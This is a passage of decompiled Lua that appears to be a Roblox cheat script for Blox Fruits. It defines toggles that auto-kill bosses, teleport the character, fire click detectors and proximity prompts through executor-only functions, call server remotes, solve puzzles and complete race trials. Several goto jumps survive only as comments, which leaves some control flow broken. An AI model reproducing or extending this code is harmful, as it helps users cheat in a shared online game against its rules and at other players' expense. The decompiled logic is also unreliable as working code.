                local v680 = GetConnectionEnemies("Beautiful Pirate")
                if v680 then
                    repeat
                        wait()
                        vu28.Kill(v680, _G.Auto_Cavender)
                    until not _G.Auto_Cavender or v680.Humanoid.Health <= 0
                else
                    _tp(CFrame.new(5283.609375, 22.56223487854, - 110.78285217285))
                end
            end
        end)
    end
end)
v226.Quests:AddToggle("Q", {
    ["Title"] = "Auto Twin Hooks",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p681)
    _G.TwinHook = p681
end)
spawn(function()
	-- upvalues: (ref) vu28
    while wait(Sec) do
        pcall(function()
			-- upvalues: (ref) vu28
            if _G.TwinHook then
                local v682 = GetConnectionEnemies("Captain Elephant")
                if v682 then
                    repeat
                        wait()
                        vu28.Kill(v682, _G.TwinHook)
                    until not _G.TwinHook or v682.Humanoid.Health <= 0
                else
                    replicated.Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(- 12471.169921875, 374.94024658203, - 7551.677734375))
                    wait(0.2)
                    _tp(CFrame.new(- 13376.7578125, 433.28689575195, - 8071.392578125))
                end
            end
        end)
    end
end)
v226.Quests:AddToggle("Q", {
    ["Title"] = "Auto Serpent Bow",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p683)
    _G.AutoSerpentBow = p683
end)
spawn(function()
	-- upvalues: (ref) vu28
    while true do
        if not wait(Sec) then
            return
        end
        if _G.AutoSerpentBow then
            local v684 = GetConnectionEnemies("Hydra Leader")
            if v684 then
                wait()
                vu28.Kill(v684, _G.AutoSerpentBow)
                if _G.AutoSerpentBow and (v684.Parent and v684.Humanoid.Health > 0) then
					-- goto l8
                end
            else
				-- ::l8::
                _tp(CFrame.new(5821.8979492188, 1019.0950927734, - 73.719230651855))
            end
        end
    end
end)
v226.Quests:AddToggle("Q", {
    ["Title"] = "Auto Lei Accessory",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p685)
    _G.AutoKilo = p685
end)
spawn(function()
	-- upvalues: (ref) vu28
    while wait(0.2) do
        if _G.AutoKilo then
            pcall(function()
				-- upvalues: (ref) vu28
                local v686 = GetConnectionEnemies("Kilo Admiral")
                if v686 then
                    repeat
                        task.wait()
                        vu28.Kill(v686, _G.AutoKilo)
                    until not _G.AutoKilo or (not v686.Parent or v686.Humanoid.Health <= 0)
                else
                    _tp(CFrame.new(2764.2233886719, 432.46154785156, - 7144.4580078125))
                end
            end)
        end
    end
end)
v226.Mirage:AddSection("Mystic Island / Full Moon")
FullMOOn = v226.Mirage:AddParagraph({
    ["Title"] = " FullMoon Status ",
    ["Content"] = ""
})
Ismirage = v226.Mirage:AddParagraph({
    ["Title"] = " Mirage Island Status ",
    ["Content"] = ""
})
spawn(function()
    while wait(0.2) do
        if workspace.Map:FindFirstChild("MysticIsland") or workspace._WorldOrigin.Locations:FindFirstChild("Mirage Island") then
            Ismirage:SetDesc(" Mirage Island : True")
        else
            Ismirage:SetDesc(" Mirage Island : False")
        end
    end
end)
spawn(function()
    while wait(0.2) do
        pcall(function()
            moon8 = "http://www.roblox.com/asset/?id=9709150401"
            moon7 = "http://www.roblox.com/asset/?id=9709150086"
            moon6 = "http://www.roblox.com/asset/?id=9709149680"
            moon5 = "http://www.roblox.com/asset/?id=9709149431"
            moon4 = "http://www.roblox.com/asset/?id=9709149052"
            moon3 = "http://www.roblox.com/asset/?id=9709143733"
            moon2 = "http://www.roblox.com/asset/?id=9709139597"
            moon1 = "http://www.roblox.com/asset/?id=9709135895"
            moon = Getmoon()
            if moon ~= moon1 then
                if moon ~= moon2 then
                    if moon ~= moon3 then
                        if moon ~= moon4 then
                            if moon ~= moon5 then
                                if moon ~= moon6 then
                                    if moon ~= moon7 then
                                        if moon == moon8 then
                                            FullMOOn:SetDesc("Moon : 7 / 8")
                                        end
                                    else
                                        FullMOOn:SetDesc("Moon : 6 / 8")
                                    end
                                else
                                    FullMOOn:SetDesc("Moon : 5 / 8 [ Last Night ]")
                                end
                            else
                                FullMOOn:SetDesc("Moon : 4 / 8 [ Full Moon ]")
                            end
                        else
                            FullMOOn:SetDesc("Moon : 3 / 8 [ Next Night ]")
                        end
                    else
                        FullMOOn:SetDesc("Moon : 2 / 8")
                    end
                else
                    FullMOOn:SetDesc("Moon : 1 / 8")
                end
            else
                FullMOOn:SetDesc("Moon : 0 / 8")
            end
        end)
    end
end)
v226.Mirage:AddToggle("Q", {
    ["Title"] = "Auto Find Mirage Island",
    ["Description"] = "turn on for finding & tween mirage island",
    ["Default"] = false
}):OnChanged(function(p687)
    _G.FindMirage = p687
end)
spawn(function()
    while wait() do
        if _G.FindMirage then
            pcall(function()
                if workspace._WorldOrigin.Locations:FindFirstChild("Mirage Island", true) then
                    _tp(workspace.Map.MysticIsland.Center.CFrame * CFrame.new(0, 300, 0))
					-- ::l9::
                    return
                else
                    local v688 = CheckBoat()
                    if not v688 then
                        local v689 = CFrame.new(- 16927.451, 9.086, 433.864)
                        TeleportToTarget(v689)
                        if (v689.Position - plr.Character.HumanoidRootPart.Position).Magnitude <= 10 then
                            replicated.Remotes.CommF_:InvokeServer("BuyBoat", _G.SelectedBoat)
                        end
						-- goto l9
                    end
                    if plr.Character.Humanoid.Sit == false then
                        local v690 = v688.VehicleSeat.CFrame * CFrame.new(0, 1, 0)
                        _tp(v690)
						-- goto l9
                    end
                    while true do
                        if true then
                            wait()
                            local v691 = CFrame.new(- 10000000, 31, 37016.25)
                            if CheckEnemiesBoat() or (CheckTerrorShark() or CheckPirateGrandBrigade()) then
                                _tp(CFrame.new(- 10000000, 150, 37016.25))
                            else
                                _tp(CFrame.new(- 10000000, 31, 37016.25))
                            end
                        end
                        if not _G.FindMirage or (v691.Position - plr.Character.HumanoidRootPart.Position).Magnitude <= 10 or (workspace._WorldOrigin.Locations:FindFirstChild("Mirage Island") or plr.Character.Humanoid.Sit == false) then
                            plr.Character.Humanoid.Sit = false
							-- goto l9
                        end
                    end
                end
            end)
        end
    end
end)
v226.Mirage:AddToggle("Q", {
    ["Title"] = "Auto Tween To Highest Point",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p692)
    _G.HighestMirage = p692
end)
spawn(function()
    while wait(Sec) do
        if _G.HighestMirage then
            pcall(function()
                if workspace._WorldOrigin.Locations:FindFirstChild("Mirage Island", true) then
                    _tp(workspace.Map.MysticIsland.Center.CFrame * CFrame.new(0, 400, 0))
                end
            end)
        end
    end
end)
v226.Mirage:AddToggle("Q", {
    ["Title"] = "Auto Collect Gear",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p693)
    _G.TPGEAR = p693
end)
spawn(function()
    pcall(function()
        while wait(0.1) do
            if _G.TPGEAR then
                local v694, v695, v696 = pairs(workspace.Map:FindFirstChild("MysticIsland"):GetChildren())
                while true do
                    local v697
                    v696, v697 = v694(v695, v696)
                    if v696 == nil then
                        break
                    end
                    if v697.Name == "Part" and v697.ClassName == "MeshPart" then
                        _tp(v697.CFrame)
                    end
                end
            end
        end
    end)
end)
v226.Mirage:AddToggle("Q", {
    ["Title"] = "Change Transparency can see",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p698)
    _G.can = p698
end)
spawn(function()
    pcall(function()
        while wait(Sec) do
            if _G.can then
                local v699, v700, v701 = pairs(workspace.Map:FindFirstChild("MysticIsland"):GetChildren())
                while true do
                    local v702
                    v701, v702 = v699(v700, v701)
                    if v701 == nil then
                        break
                    end
                    if v702.Name == "Part" then
                        if v702.ClassName ~= "MeshPart" then
                            v702.Transparency = 1
                        else
                            v702.Transparency = 0
                        end
                    end
                end
            end
        end
    end)
end)
v226.Mirage:AddToggle("Q", {
    ["Title"] = "Auto Tween Advanced Fruit Dealer",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p703)
    _G.Addealer = p703
end)
spawn(function()
    while wait() do
        if _G.Addealer then
            pcall(function()
                local v704, v705, v706 = pairs(replicated.NPCs:GetChildren())
                while true do
                    local v707
                    v706, v707 = v704(v705, v706)
                    if v706 == nil then
                        break
                    end
                    if v707.Name == "Advanced Fruit Dealer" then
                        _tp(v707.HumanoidRootPart.CFrame)
                    end
                end
            end)
        end
    end
end)
v226.Mirage:AddToggle("Q", {
    ["Title"] = "Auto Collect Mirage Chest",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p708)
    _G.FarmChestM = p708
end)
spawn(function()
    while wait(0.2) do
        if _G.FarmChestM then
            pcall(function()
                if workspace.Map.MysticIsland.Chests:FindFirstChild("DiamondChest") or workspace.Map.MysticIsland.Chests:FindFirstChild("FragChest") then
                    local v709 = game:GetService("CollectionService")
                    local v710 = game:GetService("Players").LocalPlayer
                    local v711 = v710.Character or v710.CharacterAdded:Wait()
                    if not v711 then
                        return
                    end
                    local v712 = v711:GetPivot().Position
                    local v713 = v709:GetTagged("_ChestTagged")
                    local v714 = math.huge
                    local v715 = nil
                    for v716 = 1, # v713 do
                        local v717 = v713[v716]
                        local v718 = (v717:GetPivot().Position - v712).Magnitude
                        if not SelectedIsland or v717:IsDescendantOf(SelectedIsland) then
                            if not v717:GetAttribute("IsDisabled") then
                                if v718 < v714 then
                                    v715 = v717
                                    v714 = v718
                                end
                            end
                        end
                    end
                    if v715 then
                        _tp(v715:GetPivot())
                    end
                end
            end)
        end
    end
end)
v226.Mirage:AddSection("Skull Guitars / Misc")
local vu719 = v226.Mirage:AddParagraph({
    ["Title"] = " Skull Guitar Quests ",
    ["Content"] = ""
})
spawn(function()
	-- upvalues: (ref) vu719
    while wait(0.2) do
        pcall(function()
			-- upvalues: (ref) vu719
            if Quest1 ~= true then
                if Quest2 ~= true then
                    if Quest3 ~= true then
                        if Quest4 ~= true then
                            if GetWP("Skull Guitar") then
                                vu719:SetDesc(" Quest Number : Collect!!")
                            else
                                vu719:SetDesc(" Quest Number : No Quest!!")
                            end
                        else
                            vu719:SetDesc(" Quest Number : Quest4")
                        end
                    else
                        vu719:SetDesc(" Quest Number : Quest3")
                    end
                else
                    vu719:SetDesc(" Quest Number : Quest2")
                end
            else
                vu719:SetDesc(" Quest Number : Quest1")
            end
        end)
    end
end)
v226.Mirage:AddToggle("Q", {
    ["Title"] = "Auto Skull Guitar",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p720)
    _G.Auto_Soul_Guitar = p720
end)
task.spawn(function()
    while wait() do
        if _G.Auto_Soul_Guitar then
            pcall(function()
                local v721 = GetConnectionEnemies("Living Zombie")
                if v721 then
                    v721.HumanoidRootPart.CFrame = CFrame.new(- 10138.397460938, 138.65246582031, 5902.8920898438)
                    v721.Head.CanCollide = false
                    v721.Humanoid.Sit = false
                    v721.HumanoidRootPart.CanCollide = false
                    v721.Humanoid.JumpPower = 0
                    v721.Humanoid.WalkSpeed = 0
                    if v721.Humanoid:FindFirstChild("Animator") then
                        v721.Humanoid:FindFirstChild("Animator"):Destroy()
                    end
                end
            end)
        end
    end
end)
function getT(p722)
    local v723 = nil
    if p722 == 1 then
        v723 = workspace.Map["Haunted Castle"].Tablet.Segment1.Line.Rotation
    elseif p722 == 3 then
        v723 = workspace.Map["Haunted Castle"].Tablet.Segment3.Line.Rotation
    elseif p722 == 4 then
        v723 = workspace.Map["Haunted Castle"].Tablet.Segment4.Line.Rotation
    elseif p722 == 7 then
        v723 = workspace.Map["Haunted Castle"].Tablet.Segment7.Line.Rotation
    elseif p722 == 10 then
        v723 = workspace.Map["Haunted Castle"].Tablet.Segment10.Line.Rotation
    end
    if v723 then
        return v723.Z
    end
end
function getRT(p724)
    local v725 = workspace.Map["Haunted Castle"].Trophies.Quest
    local v726, v727, v728 = pairs(v725:GetChildren())
    local v729 = nil
    while true do
        local v730
        v728, v730 = v726(v727, v728)
        if v728 == nil then
            break
        end
        if p724 == 1 and (v730.Name == "Trophy1" and v730:FindFirstChild("Handle")) then
            v729 = v730.Handle.Rotation
        elseif p724 == 2 and (v730.Name == "Trophy2" and v730:FindFirstChild("Handle")) then
            v729 = v730.Handle.Rotation
        elseif p724 == 3 and (v730.Name == "Trophy3" and v730:FindFirstChild("Handle")) then
            v729 = v730.Handle.Rotation
        elseif p724 == 4 and (v730.Name == "Trophy4" and v730:FindFirstChild("Handle")) then
            v729 = v730.Handle.Rotation
        elseif p724 == 5 and (v730.Name == "Trophy5" and v730:FindFirstChild("Handle")) then
            v729 = v730.Handle.Rotation
        end
        if v729 then
            return v729.Z
        end
    end
end
function GetFirePlacard(p731, p732)
    if tostring(workspace.Map["Haunted Castle"]["Placard" .. p731][p732].Indicator.BrickColor) ~= "Pearl" then
        fireclickdetector(workspace.Map["Haunted Castle"]["Placard" .. p731][p732].ClickDetector)
    end
end
spawn(function()
	-- upvalues: (ref) vu28
    repeat
        task.wait()
    until _G.Auto_Soul_Guitar
    while wait(Sec) do
        pcall(function()
			-- upvalues: (ref) vu28
            if _G.Auto_Soul_Guitar and World3 then
                replicated.Remotes.CommF_:InvokeServer("gravestoneEvent", 2)
                replicated.Remotes.CommF_:InvokeServer("gravestoneEvent", 2, true)
                if replicated.Remotes.CommF_:InvokeServer("GuitarPuzzleProgress", "Check") == nil then
                    _tp(CFrame.new(- 8655.0166015625, 141.31669616699, 6160.0224609375))
                    replicated.Remotes.CommF_:InvokeServer("gravestoneEvent", 2)
                    replicated.Remotes.CommF_:InvokeServer("gravestoneEvent", 2, true)
					-- goto l3
                end
                if replicated.Remotes.CommF_:InvokeServer("GuitarPuzzleProgress", "Check").Swamp == false then
                    Quest1 = true
                    Quest2 = false
                    Quest3 = false
                    Quest4 = false
                    local v733 = GetConnectionEnemies("Living Zombie")
                    if v733 then
                        task.wait()
                        vu28.Kill(v733, _G.Auto_Soul_Guitar)
                        if not _G.Auto_Soul_Guitar or (v733.Humanoid.Health <= 0 or (not v733.Parent or workspace.Map["Haunted Castle"].SwampWater.Color ~= Color3.fromRGB(117, 0, 0))) then
							-- goto l3
                        end
                    end
                    _tp(CFrame.new(- 10170.727539062, 138.65246582031, 5934.2651367188))
					-- goto l3
                end
                if replicated.Remotes.CommF_:InvokeServer("GuitarPuzzleProgress", "Check").Gravestones == false then
                    Quest1 = false
                    Quest2 = true
                    Quest3 = false
                    Quest4 = false
                    GetFirePlacard("7", "Left")
                    GetFirePlacard("6", "Left")
                    GetFirePlacard("5", "Left")
                    GetFirePlacard("4", "Right")
                    GetFirePlacard("3", "Left")
                    GetFirePlacard("2", "Right")
                    GetFirePlacard("1", "Right")
					-- goto l3
                end
                if replicated.Remotes.CommF_:InvokeServer("GuitarPuzzleProgress", "Check").Ghost == false then
                    replicated.Remotes.CommF_:InvokeServer("GuitarPuzzleProgress", "Ghost")
                    replicated.Remotes.CommF_:InvokeServer("GuitarPuzzleProgress", "Ghost", true)
					-- goto l3
                end
                if replicated.Remotes.CommF_:InvokeServer("GuitarPuzzleProgress", "Check").Trophies == false then
                    Quest1 = false
                    Quest2 = false
                    Quest3 = true
                    Quest4 = false
                    _tp(CFrame.new(- 9532.8232421875, 6.471667766571, 6078.068359375))
                    while true do
                        wait()
                        local v734 = getRT(1)
                        local v735 = getT(1)
                        if v734 and v735 then
                            fireclickdetector(workspace.Map["Haunted Castle"].Tablet.Segment1:FindFirstChild("ClickDetector"))
                        end
                        if v734 == v735 then
                            while true do
                                wait()
                                local v736 = getRT(2)
                                local v737 = getT(3)
                                if v736 and v737 then
                                    fireclickdetector(workspace.Map["Haunted Castle"].Tablet.Segment3:FindFirstChild("ClickDetector"))
                                end
                                if v736 == v737 then
                                    while true do
                                        wait()
                                        local v738 = getRT(3)
                                        local v739 = getT(4)
                                        if v738 and v739 then
                                            fireclickdetector(workspace.Map["Haunted Castle"].Tablet.Segment4:FindFirstChild("ClickDetector"))
                                        end
                                        if v738 == v739 then
                                            while true do
                                                wait()
                                                local v740 = getRT(4)
                                                local v741 = getT(7)
                                                if v740 and v741 then
                                                    fireclickdetector(workspace.Map["Haunted Castle"].Tablet.Segment7:FindFirstChild("ClickDetector"))
                                                end
                                                if v740 == v741 then
                                                    while true do
                                                        wait()
                                                        local v742 = getRT(5)
                                                        local v743 = getT(10)
                                                        if v742 and v743 then
                                                            fireclickdetector(workspace.Map["Haunted Castle"].Tablet.Segment10:FindFirstChild("ClickDetector"))
                                                        end
                                                        if v742 == v743 then
                                                            wait()
                                                            fireclickdetector(workspace.Map["Haunted Castle"].Tablet.Segment2:FindFirstChild("ClickDetector"))
                                                            fireclickdetector(workspace.Map["Haunted Castle"].Tablet.Segment5:FindFirstChild("ClickDetector"))
                                                            fireclickdetector(workspace.Map["Haunted Castle"].Tablet.Segment6:FindFirstChild("ClickDetector"))
                                                            fireclickdetector(workspace.Map["Haunted Castle"].Tablet.Segment8:FindFirstChild("ClickDetector"))
                                                            fireclickdetector(workspace.Map["Haunted Castle"].Tablet.Segment9:FindFirstChild("ClickDetector"))
                                                            if workspace.Map["Haunted Castle"].Tablet.Segment2.Line.Rotation.Z == 0 or (workspace.Map["Haunted Castle"].Tablet.Segment5.Line.Rotation.Z == 0 or (workspace.Map["Haunted Castle"].Tablet.Segment6.Line.Rotation.Z == 0 or (workspace.Map["Haunted Castle"].Tablet.Segment8.Line.Rotation.Z == 0 or workspace.Map["Haunted Castle"].Tablet.Segment9.Line.Rotation.Z == 0))) then
																-- goto l3
                                                            end
															-- goto l30
                                                        end
                                                    end
                                                end
                                            end
                                        end
                                    end
                                end
                            end
                        end
                    end
                end
				-- ::l30::
                if replicated.Remotes.CommF_:InvokeServer("GuitarPuzzleProgress", "Check").Pipes == false then
                    Quest1 = false
                    Quest2 = false
                    Quest3 = false
                    Quest4 = true
                    _tp(workspace.Map["Haunted Castle"]["Lab Puzzle"].ColorFloor.Model.Part3.CFrame)
                    fireclickdetector(workspace.Map["Haunted Castle"]["Lab Puzzle"].ColorFloor.Model.Part3.ClickDetector)
                    _tp(workspace.Map["Haunted Castle"]["Lab Puzzle"].ColorFloor.Model.Part4.CFrame)
                    fireclickdetector(workspace.Map["Haunted Castle"]["Lab Puzzle"].ColorFloor.Model.Part4.ClickDetector)
                    fireclickdetector(workspace.Map["Haunted Castle"]["Lab Puzzle"].ColorFloor.Model.Part4.ClickDetector)
                    fireclickdetector(workspace.Map["Haunted Castle"]["Lab Puzzle"].ColorFloor.Model.Part4.ClickDetector)
                    _tp(workspace.Map["Haunted Castle"]["Lab Puzzle"].ColorFloor.Model.Part6.CFrame)
                    fireclickdetector(workspace.Map["Haunted Castle"]["Lab Puzzle"].ColorFloor.Model.Part6.ClickDetector)
                    fireclickdetector(workspace.Map["Haunted Castle"]["Lab Puzzle"].ColorFloor.Model.Part6.ClickDetector)
                    _tp(workspace.Map["Haunted Castle"]["Lab Puzzle"].ColorFloor.Model.Part8.CFrame)
                    fireclickdetector(workspace.Map["Haunted Castle"]["Lab Puzzle"].ColorFloor.Model.Part8.ClickDetector)
                    _tp(workspace.Map["Haunted Castle"]["Lab Puzzle"].ColorFloor.Model.Part10.CFrame)
                    fireclickdetector(workspace.Map["Haunted Castle"]["Lab Puzzle"].ColorFloor.Model.Part10.ClickDetector)
                    fireclickdetector(workspace.Map["Haunted Castle"]["Lab Puzzle"].ColorFloor.Model.Part10.ClickDetector)
                    fireclickdetector(workspace.Map["Haunted Castle"]["Lab Puzzle"].ColorFloor.Model.Part10.ClickDetector)
                end
            end
			-- ::l3::
        end)
    end
end)
v226.Mirage:AddToggle("Q", {
    ["Title"] = "Auto Farm Material Skull Guitar",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p744)
    _G.AutoMatSoul = p744
end)
spawn(function()
	-- upvalues: (ref) vu28
    while wait(Sec) do
        pcall(function()
			-- upvalues: (ref) vu28
            if _G.AutoMatSoul and GetWP("Skull Guitar") == false then
                if GetM("Bones") >= 500 and (GetM("Ectoplasm") >= 250 and GetM("Dark Fragment") >= 1) then
                    replicated.Remotes.CommF_:InvokeServer("soulGuitarBuy", true)
					-- goto l3
                end
                if GetM("Ectoplasm") <= 250 then
                    if _G.AutoMatSoul and World2 then
                        local v745 = GetConnectionEnemies({
                            "Ship Deckhand",
                            "Ship Engineer",
                            "Ship Steward",
                            "Ship Officer",
                            "Arctic Warrior"
                        })
                        if v745 then
                            task.wait()
                            vu28.Kill(v745, _G.AutoMatSoul)
                            if not _G.AutoMatSoul or (not v745.Parent or v745.Humanoid.Health <= 0) then
								-- goto l3
                            end
                        end
                        replicated.Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(923.21252441406, 126.9760055542, 32852.83203125))
                    else
                        replicated.Remotes.CommF_:InvokeServer("TravelDressrosa")
                    end
					-- goto l3
                end
                if GetM("Dark Fragment") < 1 then
                    if _G.AutoMatSoul and World2 then
                        local v746 = GetConnectionEnemies("Darkbeard")
                        if v746 then
                            task.wait()
                            vu28.Kill(v746, _G.AutoMatSoul)
                            if _G.AutoMatSoul or v746.Humanoid.Health <= 0 then
								-- goto l42
                            end
                        end
                        _tp(CFrame.new(3798.4575195313, 13.826690673828, - 3399.806640625))
                    else
                        replicated.Remotes.CommF_:InvokeServer("TravelDressrosa")
                    end
					-- ::l42::
                    if not GetConnectionEnemies("Darkbeard") then
                        Hop()
                    end
					-- goto l3
                end
                if GetM("Bones") > 500 then
					-- goto l3
                end
                if _G.AutoMatSoul and World3 then
                    local v747 = GetConnectionEnemies({
                        "Reborn Skeleton",
                        "Living Zombie",
                        "Demonic Soul",
                        "Posessed Mummy"
                    })
                    if v747 then
                        task.wait()
                        vu28.Kill(v747, _G.AutoMatSoul)
                        if not _G.AutoMatSoul or (v747.Humanoid.Health <= 0 or (not v747.Parent or v747.Humanoid.Health <= 0)) then
							-- goto l3
                        end
                    end
                    _tp(CFrame.new(- 9504.8564453125, 172.14292907715, 6057.259765625))
                else
                    replicated.Remotes.CommF_:InvokeServer("TravelZou")
                end
            end
			-- ::l3::
        end)
    end
end)
v226.Mirage:AddButton({
    ["Title"] = "Talk With Stone",
    ["Description"] = "",
    ["Callback"] = function()
        replicated:WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer("RaceV4Progress", "Begin")
        replicated:WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer("RaceV4Progress", "Check")
        replicated:WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer("RaceV4Progress", "Teleport")
        replicated:WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer("RaceV4Progress", "Continue")
    end
})
v226.Mirage:AddToggle("Q", {
    ["Title"] = "Auto Look At Moon",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p748)
    LookM = p748
end)
function MoveCamtoMoon()
    workspace.CurrentCamera.CFrame = CFrame.new(workspace.CurrentCamera.CFrame.Position, Lighting:GetMoonDirection() + workspace.CurrentCamera.CFrame.Position)
    plr.Character.HumanoidRootPart.CFrame = CFrame.new(plr.Character.HumanoidRootPart.Position, Lighting:GetMoonDirection() + plr.Character.HumanoidRootPart.CFrame.Position)
end
task.spawn(function()
    while task.wait() do
        if LookM then
            MoveCamtoMoon()
            wait(0.1)
            replicated.Remotes.CommE:FireServer("ActivateAbility")
        end
    end
end)
v226.Mirage:AddSection("Trials Quests / Misc V4")
local vu749 = v226.Mirage:AddParagraph({
    ["Title"] = " Tiers V4 Status ",
    ["Content"] = ""
})
spawn(function()
	-- upvalues: (ref) vu749
    pcall(function()
		-- upvalues: (ref) vu749
        while wait(0.2) do
            vu749:SetDesc(" Tiers - V4  :" .. " " .. plr.Data.Race.C.Value)
        end
    end)
end)
v226.Mirage:AddToggle("Q", {
    ["Title"] = "Auto Pull Lever",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p750)
    _G.Lver = p750
end)
spawn(function()
    while wait(Sec) do
        if _G.Lver then
            pcall(function()
                local v751, v752, v753 = pairs(workspace.Map["Temple of Time"]:GetDescendants())
                while true do
                    local v754
                    v753, v754 = v751(v752, v753)
                    if v753 == nil then
                        break
                    end
                    if v754.Name == "ProximityPrompt" then
                        fireproximityprompt(v754, math.huge)
                    end
                end
            end)
        end
    end
end)
v226.Mirage:AddToggle("Q", {
    ["Title"] = "Auto Train V4",
    ["Description"] = "turn on for farm tier + auto upgrade your tier level",
    ["Default"] = false
}):OnChanged(function(p755)
    _G.AcientOne = p755
end)
spawn(function()
	-- upvalues: (ref) vu28
    while wait(Sec) do
        pcall(function()
			-- upvalues: (ref) vu28
            if _G.AcientOne then
                local v756 = {
                    "Reborn Skeleton",
                    "Living Zombie",
                    "Demonic Soul",
                    "Posessed Mummy"
                }
                for _ = 1, # v756 do
                    if plr.Character:FindFirstChild("RaceEnergy").Value ~= 1 then
                        if plr.Character:FindFirstChild("RaceTransformed").Value == false then
                            local v757 = GetConnectionEnemies(v756)
                            if v757 then
                                while true do
                                    wait()
                                    vu28.Kill(v757, _G.AcientOne)
                                    if _G.AcientOne == false then
                                        break
                                    end
                                    if v757.Humanoid.Health <= 0 then
                                        break
                                    end
                                    if not v757.Parent then
                                        break
                                    end
                                end
                            else
                                _tp(CFrame.new(- 9495.6806640625, 453.58624267578, 5977.3486328125))
                            end
                        end
                    else
                        vim1:SendKeyEvent(true, "Y", false, game)
                        replicated.Remotes.CommF_:InvokeServer("UpgradeRace", "Buy")
                        _tp(CFrame.new(- 8987.041015625, 215.86206054688, 5886.7104492188))
                    end
                end
            end
        end)
    end
end)
v226.Mirage:AddButton({
    ["Title"] = "Teleport to Temple of Time",
    ["Description"] = "",
    ["Callback"] = function()
        replicated.Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(28286.35546875, 14895.301757812, 102.62469482422))
    end
})
v226.Mirage:AddButton({
    ["Title"] = "Teleport to Ancient One",
    ["Description"] = "",
    ["Callback"] = function()
        notween(CFrame.new(28981.552734375, 14888.426757812, - 120.24584960938))
    end
})
v226.Mirage:AddButton({
    ["Title"] = "Teleport to Ancient Clock",
    ["Description"] = "",
    ["Callback"] = function()
        notween(CFrame.new(29549, 15069, - 88))
    end
})
v226.Mirage:AddToggle("Q", {
    ["Title"] = "Auto Teleport to Race Doors",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p758)
    _G.TPDoor = p758
end)
spawn(function()
    while wait(Sec) do
        pcall(function()
            if _G.TPDoor then
                if tostring(plr.Data.Race.Value) ~= "Mink" then
                    if tostring(plr.Data.Race.Value) ~= "Fishman" then
                        if tostring(plr.Data.Race.Value) ~= "Cyborg" then
                            if tostring(plr.Data.Race.Value) ~= "Skypiea" then
                                if tostring(plr.Data.Race.Value) ~= "Ghoul" then
                                    if tostring(plr.Data.Race.Value) == "Human" then
                                        _tp(CFrame.new(29237.294921875, 14889.426757812, - 206.94955444336))
                                    end
                                else
                                    _tp(CFrame.new(28672.720703125, 14889.127929688, 454.59616088867))
                                end
                            else
                                _tp(CFrame.new(28967.408203125, 14918.075195312, 234.31198120117))
                            end
                        else
                            _tp(CFrame.new(28492.4140625, 14894.426757812, - 422.11001586914))
                        end
                    else
                        _tp(CFrame.new(28224.056640625, 14889.426757812, - 210.58720397949))
                    end
                else
                    _tp(CFrame.new(29020.66015625, 14889.426757812, - 379.2682800293))
                end
            end
        end)
    end
end)
v226.Mirage:AddToggle("Q", {
    ["Title"] = "Auto Complete Trial Race",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p759)
    _G.Complete_Trials = p759
end)
function GetSeaBeastTrial()
    if not workspace.Map:FindFirstChild("FishmanTrial") then
        return nil
    end
    if workspace._WorldOrigin.Locations:FindFirstChild("Trial of Water") then
        FishmanTrial = workspace._WorldOrigin.Locations:FindFirstChild("Trial of Water")
    end
    if FishmanTrial then
        local v760 = next
        local v761, v762 = workspace.SeaBeasts:GetChildren()
        while true do
            local v763
            v762, v763 = v760(v761, v762)
            if v762 == nil then
                break
            end
            if v763:FindFirstChild("HumanoidRootPart") and ((v763.HumanoidRootPart.Position - FishmanTrial.Position).Magnitude <= 1500 and v763.Health.Value > 0) then
                return v763
            end
        end
    end
end
spawn(function()
    while wait(Sec) do
        pcall(function()
            if _G.Complete_Trials and tostring(plr.Data.Race.Value) == "Mink" then
                notween(workspace.Map.MinkTrial.Ceiling.CFrame * CFrame.new(0, - 20, 0))
            end
        end)
    end
end)
spawn(function()
    while wait(Sec) do
        pcall(function()
            if _G.Complete_Trials and (tostring(plr.Data.Race.Value) == "Fishman" and GetSeaBeastTrial()) then
                repeat
                    task.wait()
                    spawn(function()
                        _tp(CFrame.new(GetSeaBeastTrial().HumanoidRootPart.Position.X, game:GetService("Workspace").Map["WaterBase-Plane"].Position.Y + 300, GetSeaBeastTrial().HumanoidRootPart.Position.Z))
                    end)
                    MousePos = GetSeaBeastTrial().HumanoidRootPart.Position
                    Useskills("Melee", "Z")
                    Useskills("Melee", "X")
                    Useskills("Melee", "C")
                    wait(0.1)
                    Useskills("Sword", "Z")
                    Useskills("Sword", "X")
                    wait(0.1)
                    Useskills("Blox Fruit", "Z")
                    Useskills("Blox Fruit", "X")
                    Useskills("Blox Fruit", "C")
                    wait(0.1)
                    Useskills("Gun", "Z")
                    Useskills("Gun", "X")
                until _G.Complete_Trials == false or not GetSeaBeastTrial()
            end
        end)
    end
end)
spawn(function()
    while wait(Sec) do
        pcall(function()
            if _G.Complete_Trials and tostring(plr.Data.Race.Value) == "Cyborg" then
                _tp(workspace.Map.CyborgTrial.Floor.CFrame * CFrame.new(0, 500, 0))
            end
        end)
    end
end)
spawn(function()
    while wait(Sec) do
        pcall(function()
            if _G.Complete_Trials and tostring(plr.Data.Race.Value) == "Skypiea" then
                notween(workspace.Map.SkyTrial.Model.FinishPart.CFrame)
            end
        end)
    end
end)
spawn(function()
	-- upvalues: (ref) vu28
    while wait(0.1) do
        pcall(function()
			-- upvalues: (ref) vu28
            local v764 = _G.Complete_Trials and (tostring(plr.Data.Race.Value) == "Human" or tostring(plr.Data.Race.Value) == "Ghoul") and GetConnectionEnemies({
